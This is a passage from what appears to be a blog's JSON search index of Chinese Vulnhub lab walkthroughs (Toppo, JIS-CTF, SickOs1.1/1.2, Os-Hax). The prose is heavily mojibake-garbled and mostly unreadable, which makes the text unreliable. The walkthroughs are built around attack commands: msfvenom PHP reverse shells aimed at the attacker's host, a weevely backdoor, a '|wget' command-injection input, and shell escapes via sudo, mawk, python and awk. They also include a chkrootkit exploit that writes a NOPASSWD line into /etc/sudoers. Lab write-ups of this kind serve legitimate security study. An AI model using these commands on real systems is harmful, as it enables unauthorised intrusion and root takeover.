2ï¼ŒæˆåŠŸå‡çº§shellï¼šæ‹¿åˆ°shellä¹‹ååœ¨ç³»ç»Ÿé‡Œè½¬æ‚ äº†åŠå¤©ï¼Œå•¥ä¹Ÿæ²¡å‘ç°ã€‚netstatæŸ¥çœ‹ä¸€ä¸‹å¼€å¯çš„ç«¯å£ï¼Œä¼šä¸ä¼šæœ‰é—æ¼çš„åœ°æ–¹ã€‚å‘ç°é¶æœºä¸€ç›´åœ¨8080ç«¯å£ç›‘å¬æ¥è‡ªäºè‡ªå·±çš„è¿æ¥ï¼Œåªèƒ½æœ¬åœ°è®¿é—®ï¼š  \n\n\n6.å†…ç½‘ç©¿é€\n\nè¿™é‡Œæˆ‘ç†è§£çš„ä¹Ÿä¸æ˜¯å¾ˆé€å½»ï¼Œéœ€è¦å¤šæ¥è§¦ä¸€äº›å®ä¾‹ï¼Œä¸‹é¢è¿™ä¸¤ç¯‡æ–‡ç« è›®ä¸é”™çš„ï¼š  \nhttps://www.linuxprobe.com/ssh-port-forward.html  \nhttps://www.cnblogs.com/f-ck-need-u/p/10482832.html  \n\nè¿™ä¸ªé¶æœºéœ€è¦ç”¨åˆ°çš„æ˜¯æœ¬åœ°ç«¯å£è½¬å‘ï¼šå¯¹æœ¬æœº9999ç«¯å£çš„è®¿é—®ï¼Œæ˜ å°„åˆ°é¶æœºçš„8080ç«¯å£ä¸Šã€‚a.æ”»å‡»æœºkaliä¸Šç›´æ¥æ‰§è¡Œï¼šssh -N -f -L 999:127.0.0.1:8080 aeolus@192.168.xxx.xxxb.ä½¿ç”¨å·²ç»é›†æˆåˆ°Metasploitå†…çš„portfwdç«¯å£è½¬å‘/é‡å®šå‘å·¥å…·ï¼športfwd add -l 9999 -r 127.0.0.1 -p 8080è¾“å…¥å¯†ç åï¼Œåœ¨æµè§ˆå™¨è®¿é—®127.0.0.0:9999:è®¿é—®æˆåŠŸï¼Œä½¿ç”¨aeolusï¼šsergioteamoç™»å½•librenmsç³»ç»Ÿï¼Œç™»é™†åæµè§ˆäº†ä¸€ä¸‹ä¹Ÿæ²¡å‘ç°å•¥ã€‚ç”¨msfsearch librenmsæ‰¾ä¸€ä¸‹ç³»ç»Ÿçš„expï¼Œä½¿ç”¨expé…ç½®ç›¸å…³å‚æ•°ï¼šæˆåŠŸæ‹¿åˆ°ä¸€ä¸ªç”¨æˆ·cronusçš„shellã€‚\n\n7.ææƒ\n\n2021-12-01å‘å¸ƒçš„ææƒç›¸å…³æ–‡ç« ææƒ  \n\nsudoææƒsudo -lï¼šåˆ©ç”¨mysqlææƒsudo -u root mysql -e &#39;\\!/bin/bash&#39;ï¼šè¿›/rootï¼Œæ‹¿flagï¼š\n\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["Vulnhub","ææƒ","Metasoploit","å†…ç½‘ç©¿é€","smb","ftp"]},{"title":"Vulnhub|Toppo","url":"/e4c5a7f9.html","content":"0.é¶æœºå®‰è£…\nä¸å†èµ˜è¿°ï¼Œå¯çœ‹ä¹‹å‰çš„Vulnhubç›¸å…³æ–‡ç« ã€‚  \n\n1.ä¿¡æ¯æ”¶é›†\nä¸»æœºæ‰«ænmapæ‰«ænmap -sn 192.168.xxx.0/24é¶æœºå¼€æ”¾äº†22(ssh)ã€80(http)å’Œ111(rpcbind)ç«¯å£ã€‚  \n\n2.(80ç«¯å£)webå®‰å…¨\nwebè®¿é—®ï¼ŒæŸ¥çœ‹æºä»£ç webç›®å½•æ‰«æï¼šnikto -h 192.168.xxx.xxx:è®¿é—®/adminå‘ç°ä¸€ä¸ªå¯†ç 12345ted123\n\nè¿™ç§ç±»å‹å¯†ç å¯ä»¥çŒœæµ‹ç”¨æˆ·åæ˜¯ted  \n\nè®¿é—®/cssï¼šå‰ç«¯ä»£ç è®¿é—®/imgï¼šä¸€äº›æ™®é€šå›¾ç‰‡è®¿é—®/mailï¼šcontact_me.phpæ–‡ä»¶æ²¡æœ‰æš´éœ²æœ‰ç”¨ä»£ç è®¿é—®/manualï¼šapache2  \n\n3.(22ç«¯å£)SSH-getshell\n\n2021-12-03å‘å¸ƒçš„getshellç›¸å…³æ–‡ç« getshell   \n\nssh ted@192.168.xxx.xxxç”¨åˆšè·å¾—çš„ç”¨æˆ·åå¯†ç å°è¯•ç™»é™†ï¼Œç™»é™†æˆåŠŸã€‚cat /etc/passwdæŸ¥çœ‹ç”¨æˆ·ã€‚ä»¥tedèº«ä»½æƒé™æµè§ˆäº†ä¸€ä¸‹ç³»ç»Ÿï¼Œæ²¡æœ‰å‘ç°ä»€ä¹ˆã€‚  \n\n4.ææƒ\n\n2021-12-01å‘å¸ƒçš„ææƒç›¸å…³æ–‡ç« ææƒ  \n\nå°è¯•sudoææƒsudo -læ²¡æœ‰æƒé™ã€‚å°è¯•suidææƒfind / -perm -u=s -type f 2&gt;/dev/nullè·å–å¯åˆ©ç”¨ä¿¡æ¯/usr/bin/python2.7å’Œ/usr/bin/mawkï¼šåˆ©ç”¨mawkææƒï¼šmawk &#39;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#39;åˆ©ç”¨python2.7ææƒï¼špython -c &#39;import os;os.system(&quot;/bin/sh&quot;)&#39;  \n\næ³¨æ„è¿™é‡Œåªèƒ½/bin/shï¼Œä¸èƒ½bin/bash  \n\nè¿›/rootæ‹¿flag.txt:  \n\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["Vulnhub","ææƒ"]},{"title":"Vulnhub|JIS-CTF-VulnUpload-CTF01","url":"/63d10771.html","content":"0.é¶æœºå®‰è£…\nä¸å†èµ˜è¿°ï¼Œå¯çœ‹ä¹‹å‰çš„Vulnhubç›¸å…³æ–‡ç« ã€‚  \n\n1.ä¿¡æ¯æ”¶é›†\nä¸»æœºæ‰«ænmapæ‰«ænmap -sn 192.168.xxx.0/24é¶æœºå¼€æ”¾äº†22(ssh)å’Œ80(http)ç«¯å£ã€‚  \n\n2.(80ç«¯å£)webå®‰å…¨\nwebè®¿é—®ï¼ŒæŸ¥çœ‹æºä»£ç ä¸€ä¸ªç™»é™†ç•Œé¢ï¼Œæ²¡æœ‰å‘ç°ä»€ä¹ˆã€‚webç›®å½•æ‰«æï¼šnikto -h 192.168.xxx.xxx:è®¿é—®/admin_areaï¼ŒæŸ¥çœ‹æºç ï¼Œæ‹¿åˆ°flag2åŠè´¦å·å¯†ç ï¼šè®¿é—®/uploaded_filesï¼Œæ²¡æœ‰å‘ç°ä»€ä¹ˆã€‚è®¿é—®/flagï¼Œæ‹¿åˆ°flag1ï¼šè®¿é—®robots.txtï¼Œå¤§è‡´çœ‹äº†ä¸€ä¸‹æ²¡æœ‰å…¶ä»–å‘ç°ã€‚ç”¨/admin_areaæ‰¾åˆ°çš„è´¦æˆ·å¯†ç ç™»å½•ç³»ç»Ÿï¼Œå‘ç°æœ‰ä¸Šä¼ æ–‡ä»¶çš„åŠŸèƒ½ã€‚  \n\n3.getshell\n\n2021-12-03å‘å¸ƒçš„getshellç›¸å…³æ–‡ç« getshell   \n\néªŒè¯äº†ä¸€ä¸‹æ²¡æœ‰é™åˆ¶ä¸Šä¼ æ–‡ä»¶çš„å±æ€§ï¼Œæ•…æ€è·¯æ˜¯ä¸€å¥è¯æœ¨é©¬-ä¸Šä¼ -èšå‰‘è¿æ¥ï¼Œæˆ–è€…ç›´æ¥ç”¨msfç”Ÿæˆåå¼¹shellä»£ç -ä¸Šä¼ -msfç›‘å¬ã€‚è¿™é‡Œä½¿ç”¨Linuxä¸­çš„å·¥å…·weevelyç”Ÿæˆåé—¨-ä¸Šä¼ -è¿æ¥åé—¨ï¼š  \n\nweevely  \n\nç”Ÿæˆåé—¨weevely generate &lt;password&gt; &lt;path&gt;  \nè¿æ¥åé—¨weevely &lt;URL&gt; &lt;password&gt; [cmd]  \n\n\nç”Ÿæˆåé—¨æ–‡ä»¶hello.phpï¼Œä¸Šä¼ æ–‡ä»¶ï¼šç›´æ¥ä½¿ç”¨weevelyè¿æ¥åé—¨ï¼Œè¿æ¥æˆåŠŸï¼šcat /etc/passwdæŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨ï¼šls -a /var/www/htmlï¼ŒæŸ¥çœ‹æœåŠ¡å™¨æ–‡ä»¶:å‘ç°hint.txt,catæŸ¥çœ‹ï¼Œè·å¾—flag3å’Œæç¤ºä½¿ç”¨technawiç™»å½•ï¼šå‘ç°flag.txt,catæŸ¥çœ‹ï¼Œå‘ç°æ²¡æœ‰æƒé™ï¼šgrep -r &lt;å…³é”®å­—&gt; &lt;ç›®æ ‡æŸ¥æ‰¾è·¯å¾„&gt;,æŒ‰æç¤ºæŸ¥æ‰¾â€œtechnawiâ€ç›¸å…³æ–‡ä»¶ï¼Œæ‰¾åˆ°ç–‘ä¼¼åŒ…å«å¯†ç çš„æ–‡ä»¶ï¼šcat /etc/mysql/conf.d/credentials.txtæŸ¥çœ‹ç›®æ ‡æ–‡ä»¶ï¼Œæ‰¾åˆ°flag4å’Œå¯†ç ï¼šå½“å‰ç”¨æˆ·æ²¡æœ‰æƒé™ç›´æ¥suåˆ‡æ¢ç”¨æˆ·ï¼šç”¨sshè¯•è¯•ï¼Œç™»é™†æˆåŠŸï¼Œèƒ½å¤ŸæˆåŠŸæ‹¿åˆ°/var/www/html/flag.txtä¸­çš„flag5ï¼š  \n\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["Vulnhub","ææƒ","weevely"]},{"title":"Vulnhub|SickOs1.1","url":"/4de57e3c.html","content":"0.é¶æœºå®‰è£…\nä¸å†èµ˜è¿°ï¼Œå¯çœ‹ä¹‹å‰çš„Vulnhubç›¸å…³æ–‡ç« ã€‚è¿™ä¸ªé¶æœºå®‰è£…æ—¶å¦‚æœç”¨çš„VMwareï¼Œè®°å¾—æŠŠ.mfæ–‡ä»¶åˆ æ‰ï¼3.æŠ¥â€œ403â€é”™è¯¯  \n\n1.ä¿¡æ¯æ”¶é›†\nä¸»æœºæ‰«ænmapæ‰«ænmap -sn 192.168.xxx.0/24é¶æœºå¼€æ”¾äº†22(ssh)ã€8080(http-proxy)å’Œ3128(squid-http)ç«¯å£ã€‚8080æ˜¯closedçŠ¶æ€ï¼Œå…ˆä¸ç®¡å®ƒã€‚squid-httpå¯ä»¥å½“ä½œä¸€ä¸ªhttpä»£ç†æœåŠ¡  \n\n2.(80ç«¯å£)webå®‰å…¨\nwebè®¿é—®ï¼ŒæŸ¥çœ‹æºä»£ç é…ç½®æµè§ˆå™¨ä»£ç†ï¼šæˆåŠŸè®¿é—®ï¼Œæ²¡æœ‰å‘ç°ä»€ä¹ˆã€‚webç›®å½•æ‰«ædirb: dirb http://192.168.117.139 -p 192.168.117.139:3128nikto: nikto -h 192.168.117.139 -useproxy 192.168.117.139:3128è®¿é—®/robots.txtè®¿é—®/wolfcmsæµè§ˆäº†ä¸€ä¸‹ç³»ç»Ÿï¼Œæœ‰ä¸€ä¸ªä¸‹è½½æ–‡ä»¶ï¼Œä¸‹è½½åæ‰“å¼€æŸ¥çœ‹ï¼Œæ²¡æœ‰å‘ç°ä»€ä¹ˆã€‚ç»§ç»­æ‰«ä¸€ä¸‹ç›®å½•dirb http://192.168.117.139/wolfcms -p 192.168.117.139:3128ä¹Ÿæ²¡æœ‰å‘ç°ä»€ä¹ˆï¼Œçœ‹ç½‘ä¸Šçš„æ€è·¯ï¼Œç›´æ¥è®¿é—®/admin //è¿™é‡Œä¸å¤ªæ˜ç™½è®¿é—®çš„ä¾æ®æ˜¯ä»€ä¹ˆè®¿é—®/wolfcms/admin,è‡ªåŠ¨è·³è½¬åˆ°åå°ç™»é™†ç•Œé¢ï¼šå°è¯•äº†ä¸€äº›å¸¸è§„åŠæ³•ï¼Œæ²¡æœ‰æ‰¾åˆ°è´¦æˆ·ä¸å¯†ç çš„ç›¸å…³ä¿¡æ¯ï¼Œåå‘ç°ç›´æ¥aä½¿ç”¨å¼±å£ä»¤dminï¼šadminç™»é™†æˆåŠŸã€‚ç™»é™†åç±»ä¼¼ä¸€ä¸ªåšå®¢ç®¡ç†ç³»ç»Ÿã€‚   \n\n3.getshell\n\n2021-12-03å‘å¸ƒçš„getshellç›¸å…³æ–‡ç« getshell   \n\n\nmsfvenomç”Ÿæˆåå¼¹shellä»£ç +å¡«å…¥+metasploitç›‘å¬\nè¯¥ç³»ç»ŸPages/Edit Pageæ„æ€èƒ½å¤Ÿç›´æ¥ä¿®æ”¹phpä»£ç ï¼ŒéªŒè¯ä¸€ä¸‹ï¼šéªŒè¯æˆåŠŸï¼Œä½¿ç”¨msfvenomç”Ÿæˆåå¼¹shellä»£ç ï¼šmsfvenom -p php/meterpreter/reverse_tcp lhost=&lt;æ”»å‡»æœºipåœ°å€&gt; lport=&lt;æ”»å‡»æœºç›‘å¬ç«¯å£&gt; -o shell.phpç²˜è´´åˆ°ç¼–è¾‘å™¨å¹¶ä¿å­˜ç”Ÿæ•ˆ(æ³¨æ„è¦ä¸åŸç¼–è¾‘å™¨çš„å†…å®¹ç»„æˆä¸€ä¸ªå®Œæ•´çš„&lt;?php?&gt;ç»“æ„)ï¼šmetasploitå¼€å¯ç›‘å¬ï¼šgetshellæˆåŠŸï¼Œè½¬æˆäº¤äº’å¼shellï¼š  \n\n4.ææƒ\nls -aå‘ç°é…ç½®æ–‡ä»¶config.php,catæŸ¥çœ‹ï¼šæ‰¾åˆ°æ•°æ®åº“ä½¿ç”¨çš„æ˜¯mysqlï¼Œæ•°æ®åº“åwolfï¼Œç”¨æˆ·årootï¼Œå¯†ç john@123ï¼šç›´æ¥ç”¨rootï¼šjohn@123è¿™å¥—è´¦æˆ·å¯†ç suå’Œsshéƒ½ç™»é™†å¤±è´¥ã€‚cat /etc/passwdæŸ¥çœ‹ä¸€äº›ç”¨æˆ·åˆ—è¡¨ï¼Œå‘ç°ç”¨æˆ·sickosï¼Œç”¨å®ƒå°è¯•ç™»é™†ä¸€ä¸‹ï¼šç™»é™†æˆåŠŸï¼Œsudo -iåˆ‡æ¢ä¸ºrootï¼ŒææƒæˆåŠŸã€‚  \n\n\nsudo -iï¼šLinuxç»ˆç«¯å‘½ä»¤ä¸‹æ”¹å˜ç”¨æˆ·å¯¹å‘½ä»¤ä½¿ç”¨æƒé™çš„å‘½ä»¤ã€‚è·å¾—çš„æ˜¯rootç”¨æˆ·çš„ç¯å¢ƒã€‚  \nsudo -sï¼šæ‰§è¡Œç¯å¢ƒå˜é‡ä¸­çš„ SHELL æ‰€æŒ‡å®šçš„ shellï¼Œæˆ–æ˜¯ /etc/passwd é‡Œæ‰€æŒ‡å®šçš„ shell ã€‚è·å¾—çš„æ˜¯æœ¬èº«ç”¨æˆ·çš„ç¯å¢ƒã€‚  \n\n\nè¿›å…¥/rootï¼Œæ‹¿flag:  \n\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["Vulnhub","ææƒ","Metasoploit","åå¼¹shell","Msfvenom"]},{"title":"Vulnhub|Os-Hax","url":"/9c45f9e.html","content":"0.é¶æœºå®‰è£…\nä½¿ç”¨NATæ¨¡å¼ï¼Œä¿è¯ä¸æ”»å‡»æœºkaliåœ¨åŒä¸€ç½‘æ®µå†…ã€‚\n\nè¿™é‡Œé…ç½®å®Œäº†ä¹‹åå‘ç°nmapä¸åˆ°é¶æœºçš„ipã€‚\nè§£å†³åŠæ³•ï¼š1.é¶æœºå®‰è£…åæ— ip  \n\næ­¤æ—¶é¶æœºå¯åŠ¨åï¼Œåœ¨æ”»å‡»æœºä¸Šè¿›è¡Œä¸»æœºæ‰«ææ—¶åº”èƒ½æ‰«æåˆ°ã€‚\n\n1.ä¿¡æ¯æ”¶é›†\nä¸»æœºæ‰«ænmapæ‰«ænmap -sn 192.168.xxx.0/24é¶æœºå¼€æ”¾äº†22(ssh)å’Œ80(http)ç«¯å£ã€‚  \n\n2.(80ç«¯å£)webå®‰å…¨\nwebè®¿é—®ï¼ŒæŸ¥çœ‹æºä»£ç dirbæ‰«æwebç›®å½•dirb http://192.168.xxx.xxx :è®¿é—®http://192.168.117.135/html æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨ä¿¡æ¯:è®¿é—®http://192.168.117.135/img å‘ç°flaghost.pngï¼Œæ‰“å¼€å‘ç°æ²¡æœ‰æ˜ç¤ºä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼šä¸‹è½½ä¸‹æ¥ï¼Œè¿›ä¸€æ­¥æŸ¥çœ‹æ˜¯å¦è¿›è¡Œäº†å›¾ç‰‡éšå†™strings &lt;æ–‡ä»¶å&gt;å‘ç°ç–‘ä¼¼å¯†ç çš„å­—ç¬¦ä¸²ï¼šè®¿é—®http://192.168.117.135/wordpress ï¼š  \n\né¡µé¢çš„cssæ ·å¼æ²¡æœ‰åŠ è½½å‡ºæ¥ï¼Œå¹¶ä¸”ç‚¹å‡»åŠŸèƒ½åˆ‡æ¢é¡µé¢æ—¶ï¼Œurlä¼šé‡å®šå‘åˆ°localhostï¼š  \nè§£å†³åŠæ³•ï¼š2.cssåŠ è½½å¼‚å¸¸&amp;urlé‡å®šå‘   \n\nä½¿ç”¨wpscanæ‰«æ:  \n\nwpscanæ˜¯ä¸€æ¬¾ä¸“é—¨é’ˆå¯¹WordPresså®‰å…¨æ‰«æå™¨  \n\n\n\n\nåŠŸèƒ½\nå‘½ä»¤\n\n\n\n\næ‰«æå®‰è£…çš„æ’ä»¶\nwpscan â€“url http://192.168.xxx.xxx/wordpress â€“enumerate p\n\n\næ‰«æå®‰è£…çš„æ’ä»¶çš„æ¼æ´\nwpscan â€“url http://192.168.xxx.xxx/wordpress â€“enumerate vp\n\n\næšä¸¾wordpressçš„ç”¨æˆ·\nwpscan â€“url http://192.168.xxx.xxx/wordpress â€“enumerate u\n\n\n\nå‘ç°ä¸€ä¸ªç”¨æˆ·webï¼šç»“åˆä¸Šé¢å‘ç°çš„ç–‘ä¼¼å¯†ç å­—ç¬¦ä¸²passw@45ï¼Œå°è¯•ç™»é™†ï¼Œç™»é™†å¤±è´¥ï¼šå°è¯•å–å›å£ä»¤ï¼Œå¤±è´¥ï¼šæŸ¥é˜…ç½‘ä¸Šdalaoçš„æ€è·¯ï¼Œå‘ç°è¿™æ˜¯ä¸€ä¸ªç›®å½•â€¦â€¦è¿›å…¥http://192.168.117.135/passw@45 å‘ç°flag2ä»¥åŠhostconfigure ï¼šflag2å†…å®¹æ˜¯ç»è¿‡brainfuckåŠ å¯†çš„ï¼Œè§£å¯†å¾—åˆ°è´¦æˆ·å¯†ç ï¼šç™»é™†åï¼Œå‘ç°è¯¥è´¦æˆ·æ‹¥æœ‰è¶…ç®¡æƒé™ï¼š  \n\n3.getshell\n\n2021-12-03å‘å¸ƒçš„ææƒç›¸å…³æ–‡ç« getshell   \n\n3.1 msfvenomç”Ÿæˆåå¼¹shellä»£ç msfvenom -p php/meterpreter/reverse_tcp lhost=&lt;æ”»å‡»æœºipåœ°å€&gt; lport=&lt;æ”»å‡»æœºç›‘å¬ç«¯å£&gt; -o shell.php3.2.1 è¯¥ç³»ç»Ÿçš„/Appearance/theme editorä¸‹å¯ç›´æ¥ä¿®æ”¹phpä»£ç ï¼Œæ•…å¯åœ¨æ­¤å¡«å…¥ï¼šå°†msfvenomç”Ÿæˆçš„åå¼¹shellä»£ç ç²˜è´´åˆ°æŸä¸€ä¸ªphpç¼–è¾‘å™¨ä¸­ï¼ˆè¦æŠŠé¦–éƒ¨çš„â€˜/*â€™å»æ‰ï¼‰ ï¼Œä¸Šä¼ ï¼š3.2.2 è¯¥ç³»ç»Ÿçš„/Activity monitorå­˜åœ¨Command Injectionæ¼æ´ï¼Œå¯å€Ÿæ­¤wget åå¼¹shellä»£ç æ¥åå¼¹shellï¼š  \n\néªŒè¯å­˜åœ¨Command Injectionæ¼æ´ï¼š192.168.xxx.xxx|id  \n\n192.168.xxx.xxx|wget &lt;åå¼¹shellæ‰€åœ¨è·¯å¾„/shell.php&gt;3.3 æ‰“å¼€metasploitç›‘å¬ï¼š\n\næ³¨æ„ï¼šæ­¤å¤„çš„lhostä¸lportå¿…é¡»æ˜¯æ”»å‡»æœºçš„ipä¸ç«¯å£ï¼Œå³ä¸3.1 msfvenomç”Ÿæˆåå¼¹shellä»£ç é…ç½®çš„ä¸€æ ·   \n\n3.4è®¿é—®http://192.168.117.135/wordpress,getshellæˆåŠŸï¼šè·å–äº¤äº’å¼shellï¼špython -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;åˆ‡æ¢ç”¨æˆ·webç™»å½•ï¼Œç™»é™†æˆåŠŸï¼šåæ€|å‰é¢è·å¾—ä¸€ä¸ªè´¦æˆ·å¯†ç çš„æ—¶å€™å°±åº”è¯¥å°è¯•sshï¼Œè‹¥èƒ½ç™»å½•åˆ™æ— éœ€åå¼¹shellçš„å†…å®¹ç”±shåˆ‡æ¢ä¸ºbashï¼š/bin/bash  \n\n/bin/shä¸/bin/bashçš„åŒºåˆ«  \n\nshä¸€èˆ¬è®¾æˆbashçš„è½¯é“¾(symlink)ls -l /bin/sh  \nlrwxrwxrwx 1 root root 4 Sep 14 04:45 /bin/sh -&gt; bash    \nåœ¨ä¸€èˆ¬çš„Linuxç³»ç»Ÿå½“ä¸­ï¼ˆä¾‹å¤–å¦‚FreeBSDï¼ŒOpenBSDç­‰ï¼‰ï¼Œä½¿ç”¨shè°ƒç”¨æ‰§è¡Œè„šæœ¬ç›¸å½“äºæ‰“å¼€äº†bashçš„POSIXæ ‡å‡†æ¨¡å¼ã€‚  \nä¹Ÿå°±æ˜¯è¯´ /bin/sh ç›¸å½“äº /bin/bash â€“posix   \n\n\næŸ¥çœ‹ç³»ç»Ÿç”¨æˆ· cat /etc/passwd:è¿›å…¥/homeï¼Œæœ‰ä¸¤ä¸ªç”¨æˆ·æ–‡ä»¶å¤¹ï¼šè¿›å…¥/user-aï¼Œæ²¡æœ‰å‘ç°ä»€ä¹ˆã€‚è¿›å…¥/webï¼Œå‘ç°flag3ï¼š  \n\n4.ææƒ\n\n2021-12-01å‘å¸ƒçš„ææƒç›¸å…³æ–‡ç« ææƒ  \n\nå°è¯•sudoææƒï¼šåˆ©ç”¨awkï¼šsudo /usr/bin/awk &#39;&#123;system(&quot;/bin/bash&quot;)&#125;&#39;ææƒæˆåŠŸï¼Œè¿›å…¥/rootå¯»æ‰¾æœ€åä¸€ä¸ªflagï¼š\n\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["Vulnhub","ææƒ","Metasoploit","åå¼¹shell","Msfvenom"]},{"title":"Vulnhub|SickOs1.2","url":"/d4ec2f86.html","content":"0.é¶æœºå®‰è£…\nä½¿ç”¨NATæ¨¡å¼ï¼Œä¿è¯ä¸æ”»å‡»æœºkaliåœ¨åŒä¸€ç½‘æ®µå†…ã€‚\n\nè¿™é‡Œé…ç½®å®Œäº†ä¹‹åå‘ç°nmapä¸åˆ°é¶æœºçš„ipã€‚\nè§£å†³åŠæ³•ï¼š1.é¶æœºå®‰è£…åæ— ip  \n\næ­¤æ—¶é¶æœºå¯åŠ¨åï¼Œåœ¨æ”»å‡»æœºä¸Šè¿›è¡Œä¸»æœºæ‰«ææ—¶åº”èƒ½æ‰«æåˆ°ã€‚\n\n1.ä¿¡æ¯æ”¶é›†\nä¸»æœºæ‰«ænmapæ‰«ænmap -sn 192.168.xxx.0/24é¶æœºå¼€æ”¾äº†22(ssh)å’Œ80(http)ç«¯å£ã€‚  \n\n2.(80ç«¯å£)webå®‰å…¨\nwebè®¿é—®ï¼ŒæŸ¥çœ‹æºä»£ç æ‰“å¼€æ˜¯ä¸€å¼ å›¾ç‰‡blow.jpgã€‚æŸ¥çœ‹æ˜¯å¦éšå†™ï¼Œstrings &lt;å›¾ç‰‡æ‰€åœ¨è·¯å¾„/æ–‡ä»¶å&gt; æ²¡æœ‰å‘ç°ä»€ä¹ˆã€‚dirbæ‰«æwebç›®å½•dirb http://192.168.xxx.xxx //è¿™é‡Œç”¨niktoæ‰«ä¸åˆ°ï¼Œä¸æ™“å¾—ä¸ºå•¥:è®¿é—®http://192.168.xxx.xxx/test ,æ‰¾åˆ°ç‰ˆæœ¬ä¿¡æ¯:ä¸Šç½‘æœç‰ˆæœ¬æ¼æ´ï¼Œæ²¡æœ‰å‘ç°ä»€ä¹ˆã€‚æŸ¥çœ‹/testç›®å½•æ”¯æŒçš„æ–¹æ³•ï¼šnmap --script http-methods --script-args http-methods.url-path=&#39;/test&#39; 192.168.xxx.xxx  //è¿˜æœ‰å¾ˆå¤šå…¶ä»–æ–¹æ³•å…·æœ‰æ½œåœ¨é£é™©ä¸”å¯åˆ©ç”¨çš„methodï¼šéªŒè¯å¯ç”¨PUTä¸Šä¼ æ–‡ä»¶ï¼š  \n\nè¿™é‡Œæ€»æ˜¯å¤±è´¥ï¼ŒæŠ¥403ï¼Œåå‘ç°æ˜¯3.æŠ¥â€œ403â€é”™è¯¯   \n\n1.BurpSuiteï¼šæ‹¦æˆªè¯·æ±‚ï¼Œä¿®æ”¹è¯·æ±‚å¤´ä¸è¯·æ±‚æŠ¥æ–‡ï¼š2.nmap nmap 192.168.xxx.xxx -p 80 --script http-put --script-args http-put.url=&#39;/test/&lt;phpæ–‡ä»¶å&gt;&#39;,http-put.file=&quot;&lt;phpæ–‡ä»¶å&gt;&quot;&gt;3.curl curl -T &lt;phpæ–‡ä»¶å&gt; http://192.168.xxx.xxx/test/ \n\ncurlä¸Šä¼ å‡ºç°417é”™è¯¯ï¼šéœ€è¦åœ¨curlçš„å‚æ•°ä¸­åŠ ä¸Šç‰¹å®šçš„HTTP Header Expect:ï¼Œå³å°†Headerä¸­Expectçš„å€¼æ‰‹åŠ¨æŒ‡å®šä¸ºç©ºã€‚  \n\n\n3.getshell\n\n2021-12-03å‘å¸ƒçš„getshellç›¸å…³æ–‡ç« getshell   \n\nA) ä¸€å¥è¯æœ¨é©¬+èšå‰‘+/usr/share/webshells/php/php-reverse-shell.phpPUTä¸€å¥è¯æœ¨é©¬ï¼šèšå‰‘è¿æ¥æˆåŠŸï¼šä¸Šä¼ kaliè‡ªå¸¦çš„åå¼¹shellä»£ç /usr/share/webshells/php/php-reverse-shell.phpï¼Œæ–¹ä¾¿åç»­æ“ä½œï¼šä¿®æ”¹php-reverse-shell.phpï¼šé€šè¿‡èšå‰‘ä¸Šä¼ åˆ°/testç›®å½•ä¸‹ï¼šæ”»å‡»æœºå¼€å¯ç«¯å£ç›‘å¬nc -nvlp 443ï¼Œåœ¨æµè§ˆå™¨è®¿é—®/test/php-reverse-shell.phpã€‚B) msfvenomç”Ÿæˆåå¼¹shellä»£ç +PUT/ä¸Šä¼ +metasploitç›‘å¬ç”Ÿæˆåå¼¹shellï¼šmsfvenom -p php/meterpreter/reverse_tcp lhost=&lt;æ”»å‡»æœºip&gt; lport=&lt;æ”»å‡»æœºç›‘å¬ç«¯å£ï¼š443&gt; -o shell.phpcurlä¸Šä¼ ï¼šcurl -T &lt;åå¼¹ä»£ç æ‰€åœ¨è·¯å¾„/shell.php&gt; -H &#39;Expect:&#39; &quot;http://192.168.xxx.xxx/test/&quot;metasploitç›‘å¬443ï¼šgetshellæˆåŠŸï¼Œè½¬ä¸ºäº¤äº’å¼shellï¼š  \n\n4.ææƒ\n\n2021-12-01å‘å¸ƒçš„ææƒç›¸å…³æ–‡ç« ææƒ  \n\nå°è¯•sudoææƒï¼šéœ€è¦ç”¨æˆ·å¯†ç -å¤±è´¥ã€‚å°è¯•suidææƒï¼šæ²¡æœ‰æ‰¾åˆ°å¯è¡Œæ–‡ä»¶-å¤±è´¥ã€‚å°è¯•åœ¨/etc/passwdæ·»åŠ ç”¨æˆ·ï¼šå¯å†™æ–‡ä»¶é‡Œæ²¡æœ‰/etc/passwd-å¤±è´¥ã€‚æŸ¥çœ‹/etc/cron*ä¸‹æ‰€å«çš„æ‰€æœ‰æ–‡ä»¶ls la /etc/cron*:å‘ç°/etc/cron.dailyæ–‡ä»¶ä¸‹ï¼Œrootä½¿ç”¨chkrootkitå·¥å…·ã€‚  \n\nA)ç›´æ¥ä½¿ç”¨searchsploit chkrootkitæŸ¥çœ‹è¯´æ˜æ–‡æ¡£ cat usr/share/exploitdb/linux/local/33899.txtæŒ‰è¯´æ˜æ–‡æ¡£æ‰§è¡Œï¼šåˆ©ç”¨chkrootkitï¼Œæ·»åŠ å½“å‰ç”¨æˆ·www-dataåˆ°sudoersåˆ—è¡¨ä¸­ï¼š  \n\n/etc/sudoers è¯¥æ–‡ä»¶å…è®¸ç‰¹å®šç”¨æˆ·åƒrootç”¨æˆ·ä¸€æ ·ä½¿ç”¨å„ç§å„æ ·çš„å‘½ä»¤ï¼Œè€Œä¸éœ€è¦rootç”¨æˆ·çš„å¯†ç ã€‚  \n\necho &#39;chmod +w /etc/sudoers &amp;&amp; echo &quot;www-data ALL=(ALL)NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers&#39; &gt; /tmp/updatesudo -iææƒæˆåŠŸ:  \n\nsudo -iï¼šLinuxç»ˆç«¯å‘½ä»¤ä¸‹æ”¹å˜ç”¨æˆ·å¯¹å‘½ä»¤ä½¿ç”¨æƒé™çš„å‘½ä»¤ã€‚è·å¾—çš„æ˜¯rootç”¨æˆ·çš„ç¯å¢ƒã€‚  \nsudo -sï¼šæ‰§è¡Œç¯å¢ƒå˜é‡ä¸­çš„ SHELL æ‰€æŒ‡å®šçš„ shellï¼Œæˆ–æ˜¯ /etc/passwd é‡Œæ‰€æŒ‡å®šçš„ shell ã€‚è·å¾—çš„æ˜¯æœ¬èº«ç”¨æˆ·çš„ç¯å¢ƒã€‚  \n\n   